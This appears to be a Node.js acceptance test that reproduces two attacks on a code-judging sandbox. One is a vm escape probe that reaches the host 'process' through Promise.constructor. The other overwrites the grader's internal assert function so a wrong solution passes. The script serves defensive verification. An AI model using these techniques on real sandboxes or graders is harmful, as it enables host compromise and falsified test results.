// 验收复现脚本 v3：精确验证两个攻击路径
// 路径 A：vm 沙箱内 getBuiltinModule 可达性调试
// 路径 B：断言中和——userCode 顶层覆盖 __mashiroAssert9f3a__ 为 no-op，使 testCode 真实断言静默通过
import { Worker } from "node:worker_threads";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const WORKER_FILE = path.join(__dirname, "..", "lib", "sandbox-worker.mjs");

// 路径 A 调试：在 vm 沙箱内逐层探测
const debugWorker = new Worker(`
  import { parentPort } from "node:worker_threads";
  import vm from "node:vm";
  const sandbox = { Promise, Date, Math, JSON, Array, Object, String, Number, Boolean, Symbol, Map, Set, RegExp, Error, TypeError, RangeError, parseInt, parseFloat, isNaN, isFinite, encodeURIComponent, decodeURIComponent, structuredClone, setTimeout, clearTimeout, setInterval, clearInterval };
  vm.createContext(sandbox);
  const probe = \`
    (() => {
      const fn = Promise.constructor;
      const p = fn("return process")();
      return {
        pType: typeof p,
        pKeys: p ? Object.keys(p).filter(k => /builtin|binding|module/i.test(k)) : [],
        hasGetBuiltinModule: p && typeof p.getBuiltinModule,
        hasBinding: p && typeof p.binding,
        isProcess: p === process,
      };
    })()
  \`;
  try {
    const r = vm.runInContext(probe, sandbox, { timeout: 5000 });
    parentPort.postMessage({ ok: true, r });
  } catch (e) {
    parentPort.postMessage({ ok: false, error: e.message });
  }
`, { eval: true });
debugWorker.on("message", (m) => {
  console.log("=== 路径 A：vm 沙箱内 process 可达性 ===");
  console.log(JSON.stringify(m, null, 2));
  debugWorker.terminate();
});

// 路径 B：断言中和攻击
const skeleton = "function solve() {\n  return 0;\n}";
const testCode = `
async function __test__(solve) {
  const r = solve();
  __assert__(r === 42, "solve 应返回 42");
  __assert__(typeof solve === "function", "solve 是函数");
}
`;
const neutralizeCode = `
// 攻击：顶层覆盖断言为 no-op（testCode 的 __assert__ 参数在调用时求值，拿到被覆盖后的值）
__mashiroAssert9f3a__ = function () {};
function solve() {
  return 0; // 错误答案
}
`;

function runInRealSandbox(userCode) {
  return new Promise((resolve) => {
    const worker = new Worker(WORKER_FILE, {
      workerData: { userCode, testCode, skeleton },
      resourceLimits: { maxOldGenerationSizeMb: 64, maxYoungGenerationSizeMb: 16, stackSizeMb: 2 },
    });
    const timer = setTimeout(() => { worker.terminate(); resolve({ timeout: true }); }, 15000);
    worker.on("message", (m) => { clearTimeout(timer); resolve(m); });
    worker.on("error", (e) => { clearTimeout(timer); resolve({ error: e.message }); });
  });
}

const rB = await runInRealSandbox(neutralizeCode);
console.log("\n=== 路径 B：断言中和攻击（错误答案 + 覆盖断言） ===");
console.log(JSON.stringify(rB, null, 2));
console.log(rB?.success ? ">>> 结论：中和成功——错误答案也能 PASS（严重漏洞确认）" : ">>> 结论：中和被拦截");
